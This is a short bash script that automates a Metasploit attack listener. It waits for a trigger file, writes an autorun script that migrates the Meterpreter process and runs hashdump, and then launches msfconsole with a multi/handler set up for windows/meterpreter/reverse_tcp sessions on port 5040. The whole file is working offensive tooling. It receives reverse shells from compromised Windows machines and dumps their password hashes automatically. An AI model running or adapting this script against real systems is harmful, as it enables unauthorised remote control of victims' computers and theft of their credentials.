#!/usr/bin/env bash

LBlue='\033[0;94m'      # Light Blue
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

while [ ! -f .attack ];do
    clear
    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Meterpreter Shell...${Color_Off}\n"
    sleep 5
done

tput cnorm
# Create /root/autoruncommands.rc with the specified commands to auto pwn!
cat <<EOL > /root/autoruncommands.rc
run post/windows/manage/migrate
run post/windows/gather/hashdump
EOL

# Run Metasploit with the desired settings
msfconsole -q -x "use exploit/multi/handler; \
                  set PAYLOAD windows/meterpreter/reverse_tcp; \
                  set LHOST $(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'); \
                  set LPORT 5040; \
                  set ExitOnSession false; \
                  set AutoRunScript /root/autoruncommands.rc; \
                  set VERBOSE true; \
                  exploit"
